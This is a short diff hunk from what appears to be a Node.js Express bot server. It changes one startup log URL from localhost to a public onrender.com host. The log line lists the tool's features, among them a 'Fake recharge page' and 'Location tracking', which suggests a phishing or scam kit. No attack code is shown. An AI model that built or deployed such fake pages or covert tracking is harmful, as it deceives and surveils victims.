@@ -2055,7 +2055,7 @@ Use this link responsibly, asshole!
 // Start Express server
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Enhanced All-in-One Bot server running on port ${PORT}`);
-    console.log(`🌐 Web interface: http://localhost:${PORT}`);
+    console.log(`🌐 Web interface: https://teraboxn.onrender.com:${PORT}`);
     console.log(`🤖 Bot is active and ready!`);
     console.log(`📱 Features: Terabox downloader, Fake recharge page, Location tracking, Enhanced UI`);
 });
